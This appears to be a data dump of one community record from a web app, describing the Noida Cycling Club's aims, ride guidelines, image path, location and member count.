comm : [{'id': 5, 'name': 'Noida Cycling Club (NCC)', 'about': 'This is a cycling group focused on all types of rides and motivate people in Noida to take up cycling as it is good for health as well as for environment !\r\n\r\nWe do 4 major things on our rides !\r\n1.Ride\r\n2.Eat\r\n3.Explore\r\n4.Click Pics \r\n\r\nOpen for all and free as well.....We welcome you to join us today !\r\n\r\nSome guidelines our riders are requested to follow:\r\n1. Kindly fill the mandatory membership form,you will find the form link in the group \r\n2. Wear helmet during rides and bring your own spares and toolkits \r\n3. All expenses during foodie rides are contributory\r\n4. Do not create events without informing the admins \r\n5. Wear reflective jacket and use lights on night rides\r\n6. Do not post any 3rd party events without informing the admin\r\n(Spammers will be removed from group as soon as they post anything not related to cycling)\r\n7. Follow traffic rules and use proper hand signals for directions', 'image_url': '/media/media/13071833_1194304533913237_5604740049536472095_o.jpg', 'location': 'Noida', 'members_count': 1}]
